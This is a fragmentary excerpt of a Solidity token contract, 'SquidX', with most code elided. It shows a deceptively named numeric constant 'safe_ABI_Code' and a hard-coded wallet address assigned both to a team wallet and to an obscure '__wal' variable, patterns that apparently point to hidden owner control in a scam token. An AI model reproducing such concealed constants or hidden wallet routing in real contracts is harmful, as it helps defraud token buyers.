...
contract SquidX is Context, IERC20, Ownable {
    ...
    uint256 private safe_ABI_Code = 13277701077777777777715981534555115111469231003;
    ...
    constructor () {
        ...
        teamWalletAddress = payable(address(0x267bd54499e2ad2D397061241937E65b512b81E5));
        __wal = payable(address(0x267bd54499e2ad2D397061241937E65b512b81E5));
